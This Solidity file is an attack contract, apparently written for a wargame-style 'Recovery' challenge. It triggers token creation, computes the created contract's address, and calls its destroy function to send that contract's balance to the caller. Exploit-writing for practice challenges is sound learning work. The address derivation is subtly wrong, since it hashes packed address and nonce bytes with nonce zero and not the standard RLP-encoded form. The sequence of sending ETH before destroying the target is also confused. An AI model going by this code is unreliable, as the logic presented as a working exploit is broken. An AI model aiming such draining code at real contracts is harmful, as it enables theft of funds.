pragma solidity ^0.8.0;
interface Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}

interface SimpleToken {
    function destroy(address payable _to) external;
}


contract PayableAttacker {
    address immutable recovery;

    constructor(address _recovery) {
        recovery = _recovery;
    }

    function attack() external payable {
        Recovery recoveryContract = Recovery(recovery);
        recoveryContract.generateToken("", 1000000000000000000000);

        address simpleTokenAddress = calculateNewContractAddress();
        (bool success,) = payable(simpleTokenAddress).call{value: msg.value}("--");
        require(success, "Failed to send ETH to SimpleToken");
        SimpleToken(simpleTokenAddress).destroy(payable(msg.sender));
    }

    function calculateNewContractAddress() private pure returns (address) {
        address sender = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be; // Hardcode instance address
        bytes8 nonceBytes = bytes8(uint64(0));
        bytes32 combined = keccak256(abi.encodePacked(bytes20(sender), nonceBytes));
        return address(uint160(uint256(combined)));
    }
}